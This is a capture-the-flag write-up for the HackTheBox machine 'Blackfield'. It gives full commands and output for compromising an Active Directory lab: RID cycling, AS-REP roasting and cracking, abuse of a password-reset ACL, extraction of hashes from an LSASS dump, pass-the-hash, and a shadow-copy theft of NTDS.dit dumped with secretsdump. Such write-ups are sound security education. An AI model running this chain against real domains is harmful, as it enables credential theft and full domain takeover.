---
title: "HTB - Blackfield"
date: 2026-03-05
categories: [HTB, Active Directory]
tags: [Windows, AD, AS-REP-Roasting, ACL-Abuse, LSASS, Backup-Operators, Pass-the-Hash, BloodHound, kerbrute]
image:
  path: /assets/img/blackfield/blackfield.png
---



---
## Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.229.17 -- -sC -sV
```

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-05 04:47:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Classic DC fingerprint — DNS, Kerberos, LDAP, SMB, and WinRM all present. Domain is `BLACKFIELD.local`. First thing I always do on any AD box is get the hosts file sorted straight away.

```bash
nxc smb 10.129.229.17 --generate-hosts-file host
cat host | sudo tee -a /etc/hosts
```
---
## SMB Enumeration

### Share Discovery

```bash
nxc smb blackfield.local -u 'guest' -p '' --shares
```

```text
SMB    10.129.229.17  445  DC01  Share        Permissions  Remark
SMB    10.129.229.17  445  DC01  -----        -----------  ------
SMB    10.129.229.17  445  DC01  ADMIN$                    Remote Admin
SMB    10.129.229.17  445  DC01  C$                        Default share
SMB    10.129.229.17  445  DC01  forensic                  Forensic / Audit share.
SMB    10.129.229.17  445  DC01  IPC$         READ         Remote IPC
SMB    10.129.229.17  445  DC01  NETLOGON                  Logon server share
SMB    10.129.229.17  445  DC01  profiles$    READ
SMB    10.129.229.17  445  DC01  SYSVOL                    Logon server share
```

![smb-shares-guest](/assets/img/blackfield/smb-shares-guest.png)

Two non-standard shares jump out immediately — `forensic` (no access yet) and `profiles$` (readable as guest). 

Also `IPC$` read access means we can do RID cycling to enumerate domain users.

### RID Cycling

```bash
nxc smb blackfield.local -u 'guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee users.txt
```

![rid-brute](/assets/img/blackfield/rid-brute.png)

We get a solid user list out of this. 

The `profiles$` share also contains folders named after what look like domain users, but the RID brute output is cleaner and more complete — we'll use that.

![profiles-share](/assets/img/blackfield/profiles-share.png)

---

## AS-REP Roasting

Time to test this user list against Kerberos pre-auth. One thing worth knowing — the kerbrute release binary on GitHub doesn't have the pre-auth check feature. You need to build from source:

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute && go build .
sudo mv kerbrute /usr/local/bin/
```

First run without `--downgrade`:

```bash
kerbrute userenum --dc 10.129.229.17 -d BLACKFIELD.local users.txt
```

```text
[+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:96fa9d32786337c1...
```

![kerbrute-aes](/assets/img/blackfield/kerbrute-aes.png)

`support` has pre-auth disabled — but notice the hash format: `$krb5asrep$18$`. That's AES-256 (etype 18). Hashcat cannot crack this. We need to force a downgrade to RC4 (etype 23) with `--downgrade`:

```bash
kerbrute userenum --dc 10.129.229.17 -d BLACKFIELD.local users.txt --downgrade
```

```text
[+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$support@BLACKFIELD.LOCAL:45ca26b689031e16...
```

![kerbrute-rc4](/assets/img/blackfield/kerbrute-rc4.png)

Now we have a crackable `$krb5asrep$23$` hash. Crack it with hashcat:

```powershell
.\hashcat.exe -m 18200 .\hash.txt .\rockyou.txt
```

```text
$krb5asrep$23$support@BLACKFIELD.LOCAL:45ca26b6...:  #00^BlackKnight

Status: Cracked
```

Credentials: `support:#00^BlackKnight`

---
## Foothold — BloodHound & ACL Abuse

Validate the creds and check what we can reach:

```bash
nxc smb blackfield.local -u 'support' -p '#00^BlackKnight' --shares
nxc winrm blackfield.local -u 'support' -p '#00^BlackKnight'
```

```text
WINRM  10.129.229.17  5985  DC01  [-] BLACKFIELD.local\support:#00^BlackKnight
```

No WinRM. No forensic share access either. Time to map the domain.

### BloodHound Collection
```bash
rusthound-ce -d blackfield.local -u support -p '#00^BlackKnight' -c All --zip
```

Import the zip into BloodHound and start hunting.

![bloodhound-forcechangepassword](/assets/img/blackfield/bloodhound-forcechangepassword.png)

`support` has `ForceChangePassword` over `audit2020`. That's an ACL edge we can abuse directly — no need to touch LDAP manually. NXC has a module for this:

```bash
nxc smb blackfield.local -u 'support' -p '#00^BlackKnight' -M change-password -o USER=audit2020 NEWPASS=Password123
```

```text
SMB    10.129.229.17  445  DC01  [+] BLACKFIELD.local\support:#00^BlackKnight
CHANGE-P... DC01  [+] Successfully changed password for audit2020
```

Let's see what shares `audit2020` can access:

```bash
nxc smb blackfield.local -u 'audit2020' -p 'Password123' --shares
```

```text
SMB    10.129.229.17  445  DC01  forensic  READ  Forensic / Audit share.
```

![audit2020-forensic](/assets/img/blackfield/audit2020-forensic.png)

We're in the forensic share.

---

## LSASS Dump Analysis

```bash
smbclient //blackfield.local/forensic -U 'audit2020%Password123'
```

```text
smb: \> ls
  commands_output    D
  memory_analysis    D
  tools              D

smb: \memory_analysis\> ls
  lsass.zip    A  41936098  Thu May 28 16:25:08 2020
  ...
```

![forensic-lsass](/assets/img/blackfield/forensic-lsass.png)

An LSASS minidump sitting in a forensic share. Download it and parse with pypykatz:

```bash
uv tool install git+https://github.com/skelsec/pypykatz.git
pypykatz lsa minidump lsass.DMP
```

```text
== LogonSession ==
username svc_backup
domainname BLACKFIELD

    == MSV ==
        NT: 9658d1d1dcd9250115e2205d9f48400d
        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
```

![pypykatz-svcbackup](/assets/img/blackfield/pypykatz-svcbackup.png)

We have the NT hash for `svc_backup`:

```bash
nxc smb blackfield.local -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
nxc winrm blackfield.local -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
```

```text
WINRM  10.129.229.17  5985  DC01  [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

---

## Privilege Escalation — Backup Operators → NTDS Dump

Back in BloodHound, `svc_backup` is a member of the `Backup Operators` group.

![bloodhound-backupoperators](/assets/img/blackfield/bloodhound-backupoperators.png)

Backup Operators can read any file on the system regardless of ACLs — including `NTDS.dit` and the SYSTEM hive. The play here is creating a Volume Shadow Copy to access locked files, then extracting the database.

```bash
ewp -i blackfield.local -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
```

> **Note:** `ewp` is [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py) — the Python port of evil-winrm.

### Volume Shadow Copy via Diskshadow

```powershell
*Evil-WinRM* PS C:\temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
*Evil-WinRM* PS C:\temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\temp> echo "create" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\temp> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\temp> diskshadow.exe /s c:\temp\diskshadow.txt
```

### Extract NTDS.dit and SYSTEM Hive

```powershell
*Evil-WinRM* PS C:\temp> robocopy /b Z:\Windows\NTDS C:\temp ntds.dit
*Evil-WinRM* PS C:\temp> reg save hklm\system SYSTEM
*Evil-WinRM* PS C:\temp> download ntds.dit .
*Evil-WinRM* PS C:\temp> download system .
```

### Dump Hashes Offline

```bash
secretsdump.py -ntds ntds.dit -system system local
```

```text
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c

Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

![secretsdump-admin](/assets/img/blackfield/secretsdump-admin.png)

```bash
nxc smb blackfield.local -u 'administrator' -H 184fb5e5178480be64824d4cd53b99ee
```

```text
SMB  10.129.229.17  445  DC01  [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

Domain fully compromised.

---
## Attack Flow

```text
                                 BLACKFIELD.local
																	 |
													  +--------------+--------------+
													  |                             |
												 [Guest SMB]                  [RID Cycling]
												 profiles$ READ               users.txt
													  |                             |
													  +-------------+---------------+
																	|
																 [AS-REP Roast]
														  kerbrute --downgrade
																	|
														   support:#00^BlackKnight
																	|
																 [BloodHound]
														  ForceChangePassword
																	|
														   audit2020:Password123
																	|
														  [forensic share READ]
																 lsass.zip / lsass.DMP
																	|
																 [pypykatz parse]
														  svc_backup NT hash
																	|
																  [WinRM PTH]
														  Backup Operators group
																	|
													  [diskshadow + robocopy + reg save]
														  ntds.dit + SYSTEM hive
																	|
														   [secretsdump local]
														  Administrator NT hash
																	|
																DOMAIN COMPROMISED
```
